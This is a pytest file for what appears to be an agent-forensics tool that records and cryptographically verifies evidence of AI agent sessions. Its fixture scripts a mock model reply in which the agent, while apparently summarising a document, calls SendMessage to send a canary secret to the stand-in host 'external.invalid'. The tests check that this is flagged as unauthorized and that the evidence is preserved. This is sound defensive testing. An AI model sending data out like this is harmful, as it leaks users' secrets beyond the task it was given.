import json
import httpx
import pytest

ORIGINAL_CLIENT = httpx.Client
from agent_forensics.agent import run_session
from agent_forensics.common import load_json, read_jsonl, ROOT
from agent_forensics.evidence import Recorder, verify, verify_custody
from agent_forensics.experiments import completeness


@pytest.fixture
def live_protocol(monkeypatch, tmp_path):
    case = next(c for c in load_json(ROOT / "data/cases.json") if c["case_id"] == "controlled-exfiltration-2")
    monkeypatch.setattr("agent_forensics.agent.tool_schemas", lambda root: {})
    real_client = httpx.Client
    calls = []

    def respond(request):
        body = json.loads(request.content)
        calls.append(body)
        if len(calls) % 2:
            msg = {
                "role": "assistant",
                "content": None,
                "tool_calls": [
                    {
                        "id": "call-1",
                        "type": "function",
                        "function": {
                            "name": "SendMessage",
                            "arguments": json.dumps({"destination": "external.invalid", "message": case["canary"]}),
                        },
                    }
                ],
            }
        else:
            msg = {"role": "assistant", "content": "Document summarized."}
        return httpx.Response(
            200, json={"choices": [{"message": msg, "finish_reason": "stop"}], "usage": {"total_tokens": 20}}
        )

    monkeypatch.setattr(
        "agent_forensics.agent.httpx.Client", lambda **kwargs: real_client(transport=httpx.MockTransport(respond))
    )
    return case, calls


def test_graph_capture_oracle_and_resume(tmp_path, live_protocol):
    case, calls = live_protocol
    outcome = run_session(case, root=tmp_path)
    assert outcome["status"] == "completed" and outcome["action_violation"]
    assert outcome["simulated_unauthorized_actions"] == 1 and outcome["canary_in_action"]
    folder = tmp_path / "results/evidence" / outcome["session_id"]
    assert verify(folder, tmp_path / "results/public_key.pem")["valid"]
    assert verify_custody(tmp_path / "results/custody.jsonl", tmp_path / "results/public_key.pem")["valid"]
    oracle = load_json(tmp_path / "results/oracles" / f"{outcome['session_id']}.json")
    assert completeness(read_jsonl(folder / "events.jsonl"), oracle)["receipt_completeness"] == 1
    assert not any("attack_present" in json.dumps(body) for body in calls)
    run_session(case, root=tmp_path)
    assert len(calls) == 2


@pytest.mark.parametrize("finalized", [False, True])
def test_interrupted_run_preserves_prior_evidence(tmp_path, live_protocol, finalized):
    case, _ = live_protocol
    sid = f"{case['case_id']}-s42"
    recorder = Recorder(sid, {}, tmp_path)
    recorder.emit("partial", "test", {})
    if finalized:
        recorder.finish("failed", {"reason": "outcome write interrupted"})
    outcome = run_session(case, root=tmp_path)
    assert outcome["status"] == "completed"
    assert len(list((tmp_path / "results/interrupted").glob("*"))) == 1


def test_transport_failure_is_preserved(tmp_path, live_protocol, monkeypatch):
    case, _ = live_protocol
    real_client = ORIGINAL_CLIENT

    def fail(request):
        return httpx.Response(503, text="unavailable")

    monkeypatch.setattr(
        "agent_forensics.agent.httpx.Client", lambda **kwargs: real_client(transport=httpx.MockTransport(fail))
    )
    outcome = run_session(case, root=tmp_path)
    assert outcome["status"] == "failed" and "503" in outcome["failure"]
    checked = verify(tmp_path / "results/evidence" / outcome["session_id"], tmp_path / "results/public_key.pem")
    assert checked["valid"] and not checked["complete"]
